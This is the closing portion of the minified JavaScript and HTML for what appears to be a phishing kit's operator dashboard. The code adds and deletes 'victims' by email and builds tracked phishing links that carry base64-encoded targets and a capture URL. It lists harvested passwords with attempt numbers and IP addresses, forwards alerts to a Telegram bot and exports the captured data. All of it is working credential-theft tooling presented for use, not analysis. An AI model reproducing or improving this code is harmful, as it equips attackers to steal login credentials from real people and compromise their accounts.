function _vlist(){_api('list_victims',null,function(j){if(!j.ok||!j.victims||!j.victims.length){_VL.innerHTML='<div class="empty-state"><p>No targets yet</p><p style="font-size:13px">Go to <strong>Add Target</strong> tab to create one</p></div>';return}var h='';j.victims.forEach(function(v){var st=v.status||'pending';var stCl='status-'+st;var stLb=st.charAt(0).toUpperCase()+st.slice(1);h+='<div class="victim-item"><div class="victim-info"><div class="victim-email">📧 '+v.email+'</div><div class="victim-id">ID: '+v.id+'</div><span class="victim-status '+stCl+'">'+stLb+'</span></div><div class="victim-actions"><button class="btn copy-btn btn-sm" data-id="'+v.id+'" data-email="'+v.email+'">📋 Link</button><button class="btn btn-danger btn-sm" data-id="'+v.id+'">🗑️</button></div></div>'});_VL.innerHTML=h;_VL.querySelectorAll('.copy-btn').forEach(function(b){b.addEventListener('click',function(){var id=this.getAttribute('data-id'),em=this.getAttribute('data-email');var url=$('baseUrl').value||window.location.origin;var cu=$('captureUrl').value||'';var l=url+'?requestID='+id+'&target='+_b64e(em);if(cu)l+='&capture='+_b64e(cu);navigator.clipboard.writeText(l).then(function(){_al('Link copied!')}).catch(function(){_al('Copy failed','error')})})});_VL.querySelectorAll('.btn-danger').forEach(function(b){b.addEventListener('click',function(){if(!confirm('Delete this target?'))return;var id=this.getAttribute('data-id');_api('delete_victim',{id:id},function(j){if(j.ok){_al('Deleted');_vlist();_stats()}else{_al('Delete failed','error')}})})})})}

/* ---- Captures List ---- */
function _clist(){_api('list_captures',null,function(j){var c=$('capturesList');if(!j.ok||!j.captures||!j.captures.length){c.innerHTML='<div class="empty-state"><p>No credentials captured yet</p></div>';return}var h='';j.captures.forEach(function(r){var ve=r.victim_email||r.email;h+='<div class="victim-item"><div class="victim-info"><div class="victim-email">📧 '+ve+'</div><div class="victim-id">🔑 <strong>'+r.password+'</strong> | Attempt '+r.attempt+'</div><div class="victim-id" style="color:#999;font-size:11px">🕐 '+r.created_at+' | 🌐 '+(r.ip_address||'N/A')+'</div></div></div>'});c.innerHTML=h})}

/* ---- Generate Link ---- */
_GB.addEventListener('click',function(){var em=_VE.value.trim(),ci=_CI.value.trim();if(!em||!em.includes('@')){_al('Enter a valid email','error');return}_api('add_victim',{email:em,custom_id:ci},function(j){if(!j.ok){_al(j.error||'Error generating link','error');return}var url=$('baseUrl').value||window.location.origin;var cu=$('captureUrl').value||'';var l=url+'?requestID='+j.id+'&target='+_b64e(j.email);if(cu)l+='&capture='+_b64e(cu);_LT.textContent=l;_GL.style.display='block';_al('✅ Link generated! Works on any device.');_VE.value='';_CI.value='';_vlist();_stats()})})

_CL.addEventListener('click',function(){var t=_LT.textContent;if(t)navigator.clipboard.writeText(t).then(function(){_al('📋 Link copied to clipboard!')}).catch(function(){_al('Copy failed','error')})})

$('testLinkBtn').addEventListener('click',function(){var t=_LT.textContent;if(t)window.open(t,'_blank')})

/* ---- Settings ---- */
function _loadSettings(){_api('get_settings',null,function(j){if(!j.ok)return;var s=j.settings||{};if(s.target_email)$('targetEmail').value=s.target_email;if(s.base_url)$('baseUrl').value=s.base_url;if(s.capture_url)$('captureUrl').value=s.capture_url;if(s.telegram_bot)$('telegramBot').value=s.telegram_bot;if(s.telegram_chat)$('telegramChat').value=s.telegram_chat;_stats()})}

$('saveSettingsBtn').addEventListener('click',function(){var d={};d.target_email=$('targetEmail').value;d.base_url=$('baseUrl').value;d.capture_url=$('captureUrl').value;d.telegram_bot=$('telegramBot').value;d.telegram_chat=$('telegramChat').value;_api('save_settings',d,function(j){if(j.ok){_al('✅ Settings saved');_stats()}else{_al('Save failed','error')}})})

$('changePasswordBtn').addEventListener('click',function(){var p=$('newPassword').value;if(p.length<6){_al('Password must be at least 6 characters','error');return}_api('change_pwd',{new_password:p},function(j){if(j.ok){_al('✅ Password updated');$('newPassword').value=''}else{_al(j.error||'Failed','error')}})})

$('exportBtn').addEventListener('click',function(){window.open('?action=export_data','_blank')})

$('clearBtn').addEventListener('click',function(){if(!confirm('⚠️ Delete ALL victims and captures? This cannot be undone.'))return;if(!confirm('Are you sure?'))return;_api('clear_data',null,function(j){if(j.ok){_al('All data cleared');_vlist();_stats();_clist()}else{_al('Failed','error')}})})

$('testTelegramBtn').addEventListener('click',function(){var ts=$('telegramStatus');ts.textContent='Sending...';ts.style.color='#666';_api('test_telegram',null,function(j){if(j.ok){ts.textContent='✅ Sent! Check your Telegram';ts.style.color='#28a745'}else{ts.textContent='❌ '+j.error;ts.style.color='#dc3545'}setTimeout(function(){ts.textContent=''},5000)})})

/* ---- Tab Navigation ---- */
function _tabs(){document.querySelectorAll('.nav-item').forEach(function(n){n.addEventListener('click',function(){document.querySelectorAll('.nav-item').forEach(function(x){x.classList.remove('active')});this.classList.add('active');document.querySelectorAll('.tab-content').forEach(function(t){t.classList.remove('active')});var id=this.getAttribute('data-tab');$(''+id).classList.add('active');if(id==='tab-manage')_vlist();if(id==='tab-captures')_clist();if(id==='tab-dashboard')_stats()})})}

/* ---- Init ---- */
function _init(){_loadSettings();_vlist();_stats();_tabs();setInterval(_stats,15000)}

/* ---- Boot ---- */
_auth();
})();
</script>
</body>
</html>
